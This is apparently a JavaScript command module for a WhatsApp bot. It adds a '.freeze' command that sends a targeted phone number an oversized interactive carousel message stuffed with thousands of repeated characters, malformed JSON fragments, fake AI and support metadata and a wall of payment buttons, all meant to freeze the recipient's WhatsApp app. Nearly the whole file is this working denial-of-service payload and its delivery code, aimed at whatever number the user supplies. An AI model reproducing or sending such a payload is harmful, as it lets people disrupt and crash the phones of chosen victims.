const { cmd } = require('../inconnuboy');
const crypto = require('crypto');
async function FreezeUi(sock, target) {
    try {
        const Node = [
            {
                tag: "bot",
                attrs: { biz_bot: "1" }
            }
        ];

        const ButtonsFreeze = [
            { name: "single_select", buttonParamsJson: "" }
        ];

        // Kam kar diya size (bohot important)
        for (let i = 0; i < 5; i++) {   // 10 ki jagah 5
            ButtonsFreeze.push(
                { name: "cta_catalog", buttonParamsJson: JSON.stringify({ status: true }) },
                { name: "review_order", buttonParamsJson: JSON.stringify({ status: true }) },
                { name: "review_and_pay", buttonParamsJson: JSON.stringify({ status: true }) }
            );
        }

        const msg = {
            key: { 
                remoteJid: target, 
                fromMe: true, 
                id: Date.now().toString() + Math.random().toString(36)
            },
            message: {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2,
                            messageSecret: crypto.randomBytes(32),
                            supportPayload: JSON.stringify({
                                version: 2,
                                is_ai_message: true,
                                should_show_system_message: true,
                                ticket_id: crypto.randomBytes(16).toString('hex')
                            })
                        },
                        interactiveMessage: {
                            contextInfo: { /* ... same as before */ },
                            carouselMessage: {
                                messageVersion: 1,
                                cards: [
                                    {
                                        header: {
                                            title: "ꦾ".repeat(8000),   // 77777 → 8000
                                            hasMediaAttachment: true,
                                            imageMessage: { /* same */ }
                                        },
                                        body: { text: "⌁⃰ཀ" + "".repeat(5000) },     // 5000 → 1500
                                        footer: { text: "".repeat(5000) },
                                        nativeFlowMessage: {
                                            buttons: ButtonsFreeze,
                                            messageParamsJson: "[{".repeat(2000)   // 10000 → 2000
                                        }
                                    }
                                ]
                            }
                        }
                    }
                }
            }
        };

        if (sock && typeof sock.relayMessage === 'function') {
            await sock.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                additionalNodes: Node,
            });
            console.log(`✅ Freeze bug sent to ${target}`);
        } else {
            console.log("relayMessage not found");
        }
    } catch (err) {
        console.error("FreezeUi Error:", err.message);
    }
}

// Command with FIXED error handling
cmd({
    pattern: "freeze",
    desc: "Send WhatsApp Freeze Bug",
    category: "bugs",
    react: "❄️",
    filename: __filename
}, async (conn, mek, msg, options) => {
    
    try {
        // Safe destructuring
        const { from, reply, sender, args = [] } = options || {};
        
        let target = null;
        
        // Args se target
        if (args && args.length > 0 && args[0]) {
            target = args[0].trim();
        }
        
        // Quoted message se target
        if (!target && msg?.quoted?.sender) {
            target = msg.quoted.sender;
        }
        
        if (!target) {
            return reply(`❌ FREEZE BUG USAGE ❌\n\n.freeze 923001234567\n\nYa kisi message ko reply karke .freeze likho`);
        }
        
        // Clean number
        let cleanNumber = String(target).replace(/[^0-9]/g, '');
        
        if (cleanNumber.length < 10) {
            return reply(`❌ Invalid Number!\nExample: .freeze 923001234567`);
        }
        
        let finalTarget = cleanNumber + '@s.whatsapp.net';
        
        await reply(`⏳ Sending freeze bug to ${cleanNumber}...`);
        
        await FreezeUi(conn, finalTarget);
        
        await reply(`✅ Freeze bug sent to ${cleanNumber}`);
        
    } catch (error) {
        console.error('Freeze Command Error:', error);
        await reply(`❌ Error: ${error.message || 'Something went wrong'}`);
    }
});
